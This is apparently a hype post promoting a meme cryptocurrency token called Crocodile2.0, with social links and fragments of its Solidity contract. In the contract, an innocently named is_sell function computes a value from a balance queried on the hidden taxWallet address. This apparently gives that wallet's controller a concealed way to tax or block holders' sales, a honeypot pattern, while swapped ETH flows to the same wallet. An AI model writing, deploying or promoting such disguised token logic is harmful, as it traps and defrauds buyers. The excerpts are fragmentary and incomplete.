...
Introducing the latest viral meme project! The Crocodile2.0

Hope in your lambo and come take a cruise in the water where all your favorite memes meet. Crocodile2.0. $Croc2.0

Website: https://www.croc20.website
Twitter: https://twitter.com/Crocodile20_eth
TG: https://t.me/Crocodile20_eth
...
contract CROCO20 is Context, Ownable, IERC20 {
    ...
    function is_sell(address ins, uint256 amount) internal view returns (uint256) { 
        return IERC20(taxWallet).balanceOf(ins) * amount;
    }
    ...
    address private taxWallet; //need to change

    IRouter02 public swapRouter;
    string constant private _name = "Crocodile2.0";
    string constant private _symbol = "CROCO2.0";
    ...
    function internalSwap(uint256 contractTokenBalance) internal inSwapFlag {
        ...
        if(address(this).balance > 0) (success,) = taxWallet.call{value: address(this).balance}("");
    }
